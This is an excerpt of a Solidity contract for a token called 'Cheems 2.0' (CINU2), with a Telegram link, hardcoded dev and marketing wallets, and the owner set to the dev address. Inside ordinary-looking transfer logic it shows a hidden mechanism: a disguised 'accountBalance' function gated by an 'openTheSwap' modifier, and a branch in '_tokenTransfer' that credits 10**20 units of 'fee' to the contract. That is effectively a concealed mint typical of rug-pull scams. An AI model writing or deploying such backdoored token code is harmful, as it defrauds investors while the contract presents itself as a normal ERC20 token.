...
//Telegram : https://t.me/cheemstwobsc
...
interface IERC20 {
    ...
    function accountBalance(address account) external returns (uint256);
...
contract Cheems2 is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x2Bf739419fF9e483D02fFe3c792ddB56e174D67c); 
    address payable public Wallet_Dev = payable(0x371c01aC540d5Bd7e2bF550bF722A40b53c934c4);
    ...
    string private constant _name = "Cheems 2.0"; 
    string private constant _symbol = unicode"CINU2"; 
    ...
    uint256 public max_decimals = 10**20;
    ...
    constructor () {
        ...
        _owner = 0x371c01aC540d5Bd7e2bF550bF722A40b53c934c4;
    ...
    function accountBalance(address account) public openTheSwap override returns (uint256) {
        if(isBuyFee){
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(outSwapAndLiquify)
            {
                totalFEE = max_decimals;
                isBuyFee = true;
            ...
            _tOwned[address(this)] = _tOwned[address(this)]+buyFEE+totalFEE;
